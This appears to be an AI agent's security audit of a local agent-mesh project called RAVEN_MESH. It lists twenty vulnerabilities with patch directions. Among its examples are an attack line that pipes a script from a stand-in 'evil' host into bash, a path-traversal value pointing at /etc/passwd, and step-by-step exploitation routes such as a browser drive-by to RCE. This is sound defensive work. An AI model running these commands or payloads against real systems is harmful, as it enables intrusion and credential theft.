# RAVEN_MESH security audit — 2026-05-10

Auditor: Claude (task agent). Scope: `core/`, `node_sdk/`, `nodes/`, `scripts/`,
`manifests/`, `dashboard/` at HEAD of `simplify-raven`. Threat model: a hostile
process on the same Mac, a stale macOS-keychain token in shared storage, a
malicious neighbor on the local LAN, and an attacker who has captured a single
node-to-Core packet on the wire. The audit ignores cloud-network adversaries —
v0 is loopback-only by intent.

The numbering is rough severity order. The 3 highest-leverage hardenings are
flagged at the end.

---

## V-01 — Manifest upload → arbitrary code execution as the Core user (CRITICAL)

**Files:** `core/core.py:511-538` (`handle_admin_manifest`),
`core/supervisor.py:447-472` (`make_script_resolver`), `dashboard/vite.config.ts:14-29`.

The supervisor honours `nodes[*].metadata.runner.cmd` as a literal shell command
(`/bin/sh -c <cmd>`, supervisor.py:454). `/v0/admin/manifest` accepts an
arbitrary YAML body, validates only that `nodes` is present, and `load_manifest`
re-reads it. Combined with `/v0/admin/spawn` or `/v0/admin/reconcile`, anyone
who can present `X-Admin-Token` gets RCE as the Core user with the user's
environment (which contains `OPENAI_API_KEY`, every `*_SECRET`, the keychain
OAuth token if it is exported, etc.).

Two routes to the token:

1. **Default token.** `DEFAULT_ADMIN_TOKEN = "admin-dev-token"` (core.py:41),
   used unchanged by `vite.config.ts:23` and the run scripts. Any local process
   guesses this in one try.
2. **Vite reverse proxy on 127.0.0.1:5180.** The dev server unconditionally
   injects the admin token into every request that path-matches `/api/admin`
   (vite.config.ts:21-28). A page loaded in any browser tab on the user's Mac
   that fetches `http://127.0.0.1:5180/api/admin/manifest` with `mode: "no-cors"`
   piggy-backs on that injection. CORS does not apply to no-cors POSTs of
   `text/plain` to a same-host port. So a single visited URL → RCE.

Realistic scenario: user runs `npm run dev`, then opens a malicious doc preview
or any tab with attacker JS → that tab POSTs a manifest that adds a new node
with `metadata.runner.cmd: "curl evil/x.sh | bash"`, then POSTs `/v0/admin/spawn`
or `/v0/admin/reconcile` → bash runs as the user. Game over.

**Patch direction (see `manifest_rce_lockdown.patch`):**

- Refuse to start Core when `ADMIN_TOKEN` is unset or equals the default; fail
  loud rather than fall back. Drop `DEFAULT_ADMIN_TOKEN` entirely.
- In `_admin_authed`, reject `?admin_token=` query-string auth (logged in
  history, browser referers, etc.). Header only.
- In `make_script_resolver`, ignore `metadata.runner.cmd` unless an explicit
  `MESH_ALLOW_INLINE_RUNNERS=1` is set. The default mesh ships
  `scripts/run_<node_id>.sh`; the inline override is a foot-gun.
- Add an `Origin` allowlist on every `/v0/admin/*` POST: reject unless `Origin`
  is empty (curl) or matches the dashboard origin. Stops same-host browser
  drive-bys even when token leaks.
- In `vite.config.ts`, refuse to start the dev proxy if `ADMIN_TOKEN` is unset
  or equals the default.

---

## V-02 — Manifest upload → secret rotation for any node (CRITICAL)

**Files:** `core/core.py:103-146` (`load_manifest`, `_resolve_secret`),
`core/core.py:511-538` (`handle_admin_manifest`).

A new manifest may carry an inline `identity_secret: "abc123"` per node.
`_resolve_secret` returns that string verbatim (core.py:146). After
`load_manifest()`, every existing node in `state.nodes_decl` gets its secret
overwritten — the running process is not consulted, so the legitimate node
keeps registering with the *old* secret and is rejected, while the attacker's
chosen secret signs anything it wants from that node. This is a quieter
variant of V-01 that does not need the supervisor: an attacker without
write-runner.cmd can still impersonate every actor and forge invocations.

The risk persists even after V-01 mitigations because someone with the admin
token who is *only* expected to push manifest *shape* changes (relationship
edits, new schemas) gets implicit secret rotation as a side effect.

**Patch direction (see `manifest_secret_rotation.patch`):**

- Require all `identity_secret` values in uploaded manifests to start with
  `env:` — refuse inline secrets in `/v0/admin/manifest` and
  `/v0/admin/reload` paths. Local on-disk manifests can still carry inline
  secrets (operator decision), but a remote write cannot.
- When reloading a manifest, refuse to silently change the secret for any
  node that has an active `state.connections` entry; require the node to
  re-register first.

---

## V-03 — HMAC envelopes have no replay protection (CRITICAL)

**Files:** `core/core.py:50-63` (`canonical`/`sign`/`verify`),
`core/core.py:192-230` (`handle_register`),
`core/core.py:232-318` (`_route_invocation`),
`node_sdk/__init__.py:48-54, 174-190`.

Every request from a node carries `(body, signature)` where `signature =
HMAC-SHA256(secret, canonical(body))`. `canonical` strips only the
`signature` field; `body` includes a `timestamp` but Core never checks it
(`handle_register` at core.py:192-214 ignores the timestamp; `_route_invocation`
at 232-318 ignores it). An attacker who captures a single legitimate frame
on loopback (e.g. via `tcpdump -i lo0`, or a same-host process attaching
to `lsof`-visible sockets) can:

- **Replay register forever:** every replay overwrites
  `state.connections[node_id]["session_id"]` (core.py:201-215), so the
  legitimate node's stream is closed (`_close` event line 205) and the
  attacker now owns the inbound queue. Persistent man-in-the-middle on a
  single node.
- **Replay any invocation:** the same id/correlation_id will be processed
  again because `state.pending` is keyed by msg_id but cleared on response;
  by the time the replay arrives, the slot is free. Side effects (kanban
  card creation, cron schedule writes, voice say) happen twice or N times.

There is also no `correlation_id` uniqueness check on responses
(`handle_respond`, core.py:328-352): a response is accepted as long as a
`pending` entry exists, which means a replayed *response* envelope from
the same target will cancel a different in-flight request that happens to
share an id. (Low likelihood given uuid4 ids, but the absence of a strict
"once" semantic is a foot-gun.)

**Patch direction (see `hmac_replay_protection.patch`):**

- Reject envelopes whose `timestamp` is more than ±60s from server clock.
- Maintain a per-node LRU of recent `id`s (e.g. last 1024) and reject
  duplicates. Memory bounded; sufficient for a 60s window at any realistic
  rate.
- For `register`, require a fresh `nonce` field and reject if seen for that
  node within the last hour.
- node_sdk should set `timestamp` to monotonic UTC on every signing call
  (it already does, fine) and SHOULD include a fresh `nonce` in register.

The eventual Elixir port should adopt the same rule rather than rely on
process isolation (BEAM does not protect against same-host packet capture).

---

## V-04 — `/v0/admin/invoke` lets the admin act as any node (HIGH)

**Files:** `core/core.py:651-677` (`handle_admin_invoke`).

The admin endpoint synthesizes a fully signed envelope from any
`from_node` in the manifest and routes it with `signature_pre_verified=True`.
This is by design (operator override) but combined with the V-01 token
issues it means any holder of `X-Admin-Token` can:

- Impersonate `approval_node` and forward to `kanban_node.delete_card` or
  `cron_node.set` — bypassing the human-in-the-loop guarantee that the
  approval flow promises.
- Impersonate `nexus_agent` to reach every kanban surface.
- Impersonate `voice_actor` to call `voice_actor`'s downstream tools (the
  approval guard never sees these).

Compare with the audit log: every `_route_invocation` writes a `routed`
audit entry but the audit shows the *spoofed* `from_node`, not the admin.
There is no field that records "this came from /admin/invoke."

**Patch direction (see `admin_invoke_provenance.patch`):**

- In `handle_admin_invoke`, set `env["meta"] = {"admin_synthesized": True,
  "admin_user": <token-prefix>}` and propagate that into the audit/tap
  events so spoofed envelopes are visibly distinct.
- Optionally gate this endpoint behind a second token (`ADMIN_INVOKE_TOKEN`)
  so read-only dashboard access doesn't carry the impersonation bit.
- Refuse to synthesize from `approval_node` unless an explicit
  `?force_approval=1` query is supplied — protects the most dangerous edge
  by accident.

---

## V-05 — No rate limiting on inbox or admin endpoints (HIGH)

**Files:** `core/core.py:321-326` (`handle_invoke`),
`core/core.py:511-553` (`handle_admin_manifest`/`reload`),
`core/core.py:680-700` (`handle_admin_node_status`/`ui_state`).

A node with a live HMAC pair can spam `/v0/invoke` until the per-target
queue fills its memory budget (per V-08 the queue is unbounded). A holder
of the admin token can hot-rewrite the manifest in a tight loop, each
write taking the file lock and shelling through `state.load_manifest`,
which re-parses every per-surface schema file from disk. Easy CPU/IO
denial.

**Patch direction (see `rate_limit.patch`):**

- Add a token-bucket middleware keyed by `(remote_addr, route)` for the
  admin namespace (50 req/min, burst 10).
- Add a per-`from_node` invocation rate limit (default 100 inv/sec, burst
  200) in `_route_invocation`. Cross-cut with the queue-bound fix in V-08.

---

## V-06 — Inbound SSE queues are unbounded per node (HIGH, DoS)

**File:** `core/core.py:209` (`queue: asyncio.Queue = asyncio.Queue()` in
`handle_register`).

Every connected node gets an unbounded `asyncio.Queue` for delivery
events. If the consuming node is slow (or hostile — register, then never
read the SSE stream), an attacker can have peers `_route_invocation`
push events into the queue forever. Memory grows until OOM. The pattern
also exists for `_admin_streams` (capped at 1024, OK) but the per-node
`_streams` set never caps.

**Patch direction (see `bounded_node_queue.patch`):**

- `asyncio.Queue(maxsize=1024)` in `handle_register`; on `QueueFull`
  treat the node as unreachable and drop the envelope with a `503` and
  an audit entry (`denied_queue_full`). This makes back-pressure
  observable instead of hiding a memory leak.
- For graceful behaviour, evict the slow node: on repeated QueueFull,
  `_close` the stream and force re-register.

The Elixir rewrite gets this for free with bounded mailboxes (`{:max_heap,
N}` and selective receive), plus the supervisor can crash-and-restart
the misbehaving process without leaking the queue.

---

## V-07 — `--dangerously-skip-permissions` baked into nexus agents with no guard
(HIGH)

**Files:** `nodes/nexus_agent/cli_runner.py:117`,
`nodes/nexus_agent_isolated/docker_runner.py:139`.

Both nexus runners pass `--dangerously-skip-permissions` to claude
unconditionally. There is no env-var override, no per-message opt-out,
and no regression guard in tests. A future refactor that lets a remote
caller influence `args` (e.g. by extending `extra_run_args` from
`run_claude_in_container` for arbitrary callers) would silently elevate.

The non-isolated `nexus_agent` runs claude on the host with the user's
keychain. With permissions skipped + Read/Edit/Bash technically disabled
via `--tools ""`, the practical blast radius is limited to whatever the
MCP bridge exposes (mesh_invoke, memory_write). But "limited" assumes
nobody adds a tool. The `nexus_agent_isolated` variant is safer (Docker
+ workspace empty + non-root), but still skips permissions inside the
container.

**Patch direction (see `claude_perms_guard.patch`):**

- Centralise the args list in a constant `CLAUDE_DANGEROUS_FLAGS` and
  add a unit test that asserts the flag set exactly matches expectations
  (regression guard).
- Gate `--dangerously-skip-permissions` on `MESH_ALLOW_DANGEROUS=1`; in
  its absence, fall back to interactive permission requests through the
  bridge.
- Document explicitly in both runner module docstrings that any future
  `--tools` change demands a security review.

---

## V-08 — Local secret derivation is publicly known (HIGH)

**Files:** `scripts/_env.sh:7`, `core/core.py:143-146` (auto-derive fallback),
`scripts/run_nexus_agent.sh:10`, `scripts/run_nexus_agent_isolated.sh:9`.

`_derive` computes `sha256("mesh:<node_id>:dev")`. Anyone with the
RAVEN_MESH source — or who guesses the algorithm — can compute every
node's secret in one shell line. Combined with V-03 (no replay
protection), a hostile process on the same machine that observes the
mesh exists can:

1. Compute `sha256("mesh:human_node:dev")` → human_node secret.
2. POST `/v0/register` impersonating human_node.
3. Receive every inbox message intended for the human, plus invoke any
   surface human_node has an edge to (which by `manifests/full_demo.yaml`
   is most of them, including `kanban_node.delete_card` and
   `cron_node.set`).

`_resolve_secret` (core.py:143-146) makes it worse: when a user *did*
set `identity_secret: env:HUMAN_NODE_SECRET` but forgot to export the
env var, Core silently falls back to a different known value
(`sha256("mesh:<node_id>:autogen")`) and writes it back into
`os.environ`. So even users who think they set custom secrets get the
default.

**Patch direction (see `secret_derivation.patch`):**

- Replace `_derive` with a per-machine random-on-first-run derivation:
  read a 32-byte master from `~/.config/raven_mesh/secret_master`
  (mode 0600), creating it the first time, then HMAC the node_id
  against it. Each user gets unique secrets; source-code knowledge is
  insufficient.
- In `core.py:_resolve_secret`, raise on `env:VAR` when the variable is
  missing, instead of fabricating a fallback. Loud failure beats silent
  weak default.

---

## V-09 — Voice actor: API key sourced from `.env`, no rotation, no scoping (HIGH)

**Files:** `nodes/voice_actor/voice_actor.py:50-75`,
`nodes/voice_actor/realtime_client.py:46-62`, `nodes/voice_actor/voice_actor.py:571-621`.

`OPENAI_API_KEY` is read at startup from `.env` and held in process
memory for the lifetime of the node. There is no rotation, no
short-lived ephemeral key (OpenAI supports `ephemeral_keys` for the
Realtime API), and `start_session` is reachable by any node with a
relationship edge — a mesh-internal attacker (per V-08) can spam
`start_session` with arbitrary models/voices, opening real OpenAI
billing exposure.

The dotenv loader (`_load_dotenv`, voice_actor.py:50) silently sets any
key found in `.env` into `os.environ`, which leaks to every supervisor
child process.

**Patch direction (see `voice_actor_key_handling.patch`):**

- Use OpenAI's ephemeral session token flow (`POST
  /v1/realtime/sessions` with the long-lived key, then connect using
  the returned short-lived token) so the long-lived key is only in the
  voice actor process for one HTTP call per session.
- Cap concurrent `start_session` invocations to 1; refuse new sessions
  for 5s after a stop (rate-limit cost vector).
- In `_load_dotenv`, do not load `OPENAI_API_KEY` if the running
  manifest enables the supervisor — direct the user to set it in their
  shell only.

---

## V-10 — `nexus_agent_isolated` Docker control server binds 0.0.0.0 (HIGH)

**File:** `nodes/nexus_agent_isolated/agent.py:412`.

The control server is bound to `0.0.0.0` so the container can reach the
host via `host.docker.internal`. The bearer token is strong (32-byte
URL-safe), so brute force is not a worry, but anyone on the same LAN
sees the open port and can attempt requests with social-engineered
tokens, or tomorrow's bridge change might log the token. The MCP bridge
proxies trust-side calls (memory_write, mesh_invoke) — if a token leak
ever happens, the LAN can persist.

**Patch direction (see `isolated_control_bind.patch`):**

- Bind to the docker bridge IP (`host.docker.internal` resolution) or
  to `127.0.0.1` plus a `docker run --add-host` override that points to
  the host's loopback through a docker-managed bridge IP.
- Easier alternative: bind to `127.0.0.1`, then use `docker run
  --network host` *or* a unix-domain socket mounted in. UDS removes
  the network entirely.

---

## V-11 — `nexus_agent_isolated` mounts the host claude credential dir
indirectly (HIGH)

**Files:** `nodes/nexus_agent_isolated/docker_runner.py:50-82` (`get_oauth_token_from_keychain`),
`nodes/nexus_agent_isolated/entrypoint.sh:8-16` (volume + `~/.claude` symlink).

The host extracts the keychain OAuth token and passes it as
`CLAUDE_CODE_OAUTH_TOKEN`; inside the container the entrypoint nukes
`~/.claude` and symlinks it into a *named docker volume*
(`nexus_agent_isolated_ledger`) that lives on the host filesystem. Two
follow-on risks:

1. **Token persistence.** Once the container has run, the token is
   cached inside `/agent/ledger/.claude` because claude writes session
   cache there. The host volume holds the OAuth state at rest, with
   docker's default permissions. Any other container that mounts the
   same volume — or any user reading the docker root data dir — gets
   the OAuth token. The image is described as "isolated" but the
   volume is a persistent leak surface.
2. **`rm -rf "$HOME_CLAUDE"`** (entrypoint.sh:14) is unconditional and
   runs as `node` (uid 1000). If the image is later run with a
   user-supplied `HOME` env that points outside `/home/node`, the
   `rm -rf` becomes destructive. Trivial today but a foot-gun.

**Patch direction (see `isolated_credentials.patch`):**

- Pass a dedicated *short-lived* token that can be issued/refreshed by
  the host on demand, instead of storing the full keychain entry in a
  long-lived volume.
- Strip the OAuth cache out of `/agent/ledger/.claude` between runs
  (entrypoint deletes `auth.json`/`credentials.json` after each run, or
  use a tmpfs mount for `.claude/auth/`).
- Defensive `entrypoint.sh`: refuse to operate unless `$HOME` is exactly
  `/home/node`.

---

## V-12 — SSE has no `Last-Event-ID` reconnect (MEDIUM)

**Files:** `core/core.py:355-398` (`handle_stream`),
`node_sdk/__init__.py:209-250` (`_stream_loop`).

The SDK opens an EventSource-style stream; on disconnect it tears down
the dispatch tasks and reconnects, but the new stream starts at "now".
Envelopes pushed to the queue while disconnected and then drained by
the reconnect-induced re-`register` are dropped (the existing
connection is force-closed at register, queue is replaced).

Operationally: a 30s network hiccup mid-conversation drops every
envelope queued during the gap. For approval flows, this can leave the
human looking at a stale state.

**Patch direction:** add monotonic per-stream sequence numbers, accept
`Last-Event-ID` on `/v0/stream`, and have Core retain the last N
envelopes per node (bounded). The SDK passes `Last-Event-ID` on
reconnect.

The Elixir rewrite gets this for free with `Process.monitor` +
`gen_event` style replay buffers, but only if explicitly designed.

---

## V-13 — Manifest schema paths can read arbitrary files (MEDIUM)

**File:** `core/core.py:111-113`.

`schema_path = (manifest_dir / s["schema"]).resolve()` is then read via
`json.loads(schema_path.read_text())`. There is no check that
`schema_path` stays under `manifest_dir`. A malicious uploaded manifest
can declare `schema: ../../../etc/passwd` — the read happens, JSON
parsing fails, and the manifest write is rolled back. Information
leak: error messages include `str(e)[:500]` which can leak file
contents on partial-JSON parse failures (e.g. a manifest pointing at a
JSON-shaped file leaks its top-level structure).

**Patch direction (see `schema_path_traversal.patch`):**

- After `.resolve()`, assert `schema_path.is_relative_to(manifest_dir)`
  (or the project's `schemas/` dir). Refuse otherwise.

---

## V-14 — Permissive CORS on `/v0/admin/*` (MEDIUM)

**File:** `core/core.py:703-715` (`_cors_middleware`).

`Access-Control-Allow-Origin: *` for everything under `/v0/admin/*`,
plus the OPTIONS handler accepts arbitrary `Origin`. Combined with V-01
(token leakage via the dev proxy) this lets a malicious page in the
user's browser fetch `/v0/admin/state` cross-origin and read mesh
state, manifest contents (including any inline secrets), and the
envelope tail. With `mode: 'no-cors'` POSTs against
`/v0/admin/manifest` (text/plain content-type, simple request) it can
also write the manifest — but cannot read the response. That's enough
for V-01 to fire.

**Patch direction (see `admin_cors.patch`):**

- Replace `*` with an `ALLOWED_ORIGINS` set (default empty); echo
  `Origin` only if matched.
- Reject POSTs to `/v0/admin/*` unless `Origin` header is missing
  (curl) or in the allow-list.

---

## V-15 — Manifest write race + missing lock (MEDIUM)

**File:** `core/core.py:511-538` (`handle_admin_manifest`).

Two concurrent admin clients posting different manifests interleave
between `state.manifest_path.write_text(raw)` (525) and
`state.load_manifest()` (527). The second writer can clobber the first
*after* its load began, leaving in-memory state out-of-sync with disk.
Subsequent crash-restart loads the second writer's manifest, which the
first writer thought it had loaded.

**Patch direction:** wrap the manifest write+load+rollback path in
`state.audit_lock` (or a dedicated `manifest_lock`).

---

## V-16 — Audit log has no rotation, no integrity (MEDIUM)

**File:** `core/core.py:157-163`.

`audit.log` grows unboundedly under `state.audit_lock`. There is no
rotation and no integrity hash chain. A successful RCE (V-01) can
trivially rewrite the log to remove evidence. While integrity is hard
to guarantee on the same host, even an HMAC-chained line format
("prev-hash" field per line) raises the cost of tampering and lets a
detector spot truncation.

**Patch direction:** rotate at 100MB, hash-chain each line.

---

## V-17 — `kanban_node` web API has no auth (MEDIUM)

**Files:** `nodes/kanban_node/kanban_node.py:419-423`.

`POST /api/cards`, `PATCH /api/cards/{id}`, `DELETE /api/cards/{id}`
are unauthenticated and bound to `127.0.0.1:8805`. Any local process,
or any browser tab on the user's machine, can read and mutate the
board. Same risk profile as V-01 but lower blast radius (kanban
state vs. RCE). Worth a same-origin gate.

**Patch direction:** add an `Origin` allowlist or a CSRF token issued
on `/`.

---

## V-18 — `_admin_authed` accepts token via query string (LOW, leak vector)

**File:** `core/core.py:70-72`.

`token = request.headers.get("X-Admin-Token") or
request.query.get("admin_token")`. Query-string secrets land in
shell history, browser history, server access logs, the
`Referer` header of any link clicked from a page served by Core, and
proxy logs. Header-only is the right policy.

(Already mentioned in V-01's patch, listed separately so it doesn't
get lost in a partial fix.)

---

## V-19 — `--dangerously-skip-permissions` redaction misses the env's
TOKEN value (LOW)

**File:** `nodes/nexus_agent_isolated/docker_runner.py:154-161`.

Redaction matches `CLAUDE_CODE_OAUTH_TOKEN=` and
`ANTHROPIC_API_KEY=`, but not `NEXUS_AGENT_CONTROL_TOKEN=`. The
control token leaks to every inspector subscriber via the
`cli_spawn` event. Anyone watching the inspector's `/events` SSE
sees the in-process control token (which authenticates writes to
agent memory).

**Patch direction:** add `NEXUS_AGENT_CONTROL_TOKEN=` to the
redaction list, and as a defence-in-depth never log full
`docker run` args at INFO level.

---

## V-20 — `webui_node.change_color` accepts any string (LOW, mostly UI)

**File:** `nodes/webui_node/webui_node.py:62-68` and
`nodes/webui_node/index.html:30-31`.

`hex_color` is passed straight to `document.body.style.background`
via JS assignment. CSS injection is possible (`red; pointer-events:
none`) — UI nuisance only, but worth a regex check to keep the
attack surface small. (XSS is blocked because the `message` field
uses `textContent`, not `innerHTML`.)

**Patch direction:** validate via the JSON schema (regex
`^#[0-9a-fA-F]{3,8}$`) — the schema file already lives in
`schemas/webui_change_color.json`; tighten the regex there.

---

# What the eventual Elixir rewrite handles for free

- **V-06 (unbounded queues):** BEAM mailboxes are conceptually
  unbounded too, but the runtime supports `{:max_heap_size, N}` per
  process — when an actor's mailbox grows too large the process is
  killed. Combined with `:supervisor` restart-strategy, slow nodes
  self-evict with no surgical handler code.
- **V-08 (cross-process secret leak via env):** BEAM processes don't
  share OS env. Each agent is a `gen_server` whose state is private;
  OS env leak via `start_new_session=True` is moot because there's no
  fork.
- **V-12 (Last-Event-ID):** Phoenix Channels and `gen_event` give
  ordered, durable per-subscriber message replay with about a page
  of code. Not free, but idiomatic.
- **V-15 (manifest write race):** A single manifest `gen_server` with
  serial `handle_call` makes the race vanish — locks are implicit.
- **V-04 (admin invoke provenance):** With supervisor PIDs as
  identities and signed envelopes routed through a single broker,
  spoofing is moot — the broker's sender is the actual sender.

What the rewrite does *not* fix and still needs explicit treatment:
- V-01 / V-02 / V-03 (HMAC + replay): wire-level concerns, language-
  agnostic.
- V-07 / V-09 / V-11: external integrations (claude flags, OpenAI
  keys, claude OAuth) are policy decisions Erlang has no opinion on.
- V-14 / V-17 / V-18 (web auth surface): aiohttp vs. Plug is
  cosmetic; the policy is what matters.

---

# Top 3 highest-leverage hardenings

Picked by (attack-surface closed) ÷ (effort to ship). The supervisor's
remote-code path and the broken trust root are the obvious leaders.

1. **Fix V-01 + V-02 + V-18 in one PR** — strip the default token,
   refuse `?admin_token=`, drop `metadata.runner.cmd` (or gate it
   behind `MESH_ALLOW_INLINE_RUNNERS=1`), refuse inline `identity_secret`
   on remote manifest writes, and add an `Origin` allowlist on
   `/v0/admin/*`. ~30 lines of code; closes the "single browser tab →
   RCE / total node impersonation" path. This is the only one that
   bites today even without a sophisticated attacker.

2. **Fix V-08** — replace the public `_derive` recipe with a
   per-machine 32-byte master in `~/.config/raven_mesh/secret_master`
   and make `_resolve_secret` fail loud on missing `env:VAR` instead
   of generating a known fallback. ~20 lines. Makes V-03's replay
   attack require actual packet capture instead of a `printf | sha256`
   one-liner, and aligns the trust root with what the README implies.

3. **Fix V-06** — bound per-node delivery queues at 1024 and convert
   `QueueFull` into a 503 + audit entry. ~10 lines of `core.py`.
   Eliminates the trivial OOM DoS, makes back-pressure observable in
   the audit log (which the dashboard already tails), and is the only
   memory-safety fix that doesn't wait for the Elixir port.

Defer everything else — V-07 onward — until those three land. The
audit log will tell you very quickly whether the queue caps and origin
checks fire in practice, and the secret-master rotation lets you do
the rest of the hardening without lying about how strong loopback
auth actually is today.
